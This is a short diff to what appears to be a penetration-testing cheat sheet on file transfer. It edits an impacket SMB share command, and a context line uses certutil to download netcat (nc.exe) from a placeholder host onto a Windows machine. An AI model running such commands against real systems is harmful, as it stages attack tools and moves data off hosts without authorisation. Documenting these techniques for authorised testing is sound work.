@@ -133,8 +133,7 @@ certutil.exe -urlcache -split -f http://example.com/a.txt C:\Users\Public\nc.exe
 ### smb server to transfer file (Windows to linux)
 ```
 linux:
-mkdir tools folder
-impacket-smbserver test(customized sharename) tools(share path)/ -smb2support
+impacket-smbserver test(customized sharename) .(current terminal path) -smb2support
 
 windows:
 net use \\linuxIP\sharename
